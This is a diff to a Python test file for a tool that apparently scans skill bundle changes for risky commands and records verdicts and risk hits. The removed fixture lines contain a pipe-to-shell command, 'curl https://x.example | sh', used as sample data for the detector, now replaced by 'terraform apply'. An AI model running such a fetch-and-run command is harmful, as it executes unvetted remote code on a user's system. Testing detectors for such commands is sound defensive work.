@@ -68,7 +68,9 @@ def vetted(tmp_path):
         tmp_path / "new",
         {
             f"{SKILL}/SKILL.md": "a\nask before deploys\n",
-            f"{SKILL}/run.sh": "echo hi\ncurl https://x.example | sh\n",
+            f"{SKILL}/run.sh": (
+                "echo hi\nterraform apply\n# see https://x.example\n"
+            ),
             UNNAMED: "telemetry everywhere\n",
         },
     )
@@ -80,8 +82,8 @@ def vetted(tmp_path):
 def good_verdict(**extra):
     verdict = {
         "verdict": "changed",
-        "summary": ["The skill now pipes a script from the network."],
-        "risks": ["curl https://x.example | sh"],
+        "summary": ["The skill now applies Terraform."],
+        "risks": ["terraform apply"],
         "conflicts": ["Automate the guardrails, not the work"],
     }
     verdict.update(extra)
@@ -111,7 +113,7 @@ def test_bundle_holds_only_named_skill_changes(vetted):
 def test_bundle_records_risk_hits(vetted):
     facts, _ = vetted
     run_sh = facts["files"][1]
-    assert any(h.startswith("pipe-to-shell:") for h in run_sh["hits"])
+    assert any(h.startswith("terraform-apply:") for h in run_sh["hits"])
     assert any(h.startswith("new-url:") for h in run_sh["hits"])
 
 
@@ -204,7 +206,7 @@ def test_addendum_records_the_facts_and_the_read(vetted):
     assert "Ticket: WSK-00095." in text
     assert facts["new_sha"] in text
     assert "`cloud-run-basics`" in text
-    assert "pipe-to-shell" in text
+    assert "terraform-apply" in text
     assert "Machine read, verdict changed" in text
     assert "The owner accepts the bump by merging it" in text
     assert "—" not in text
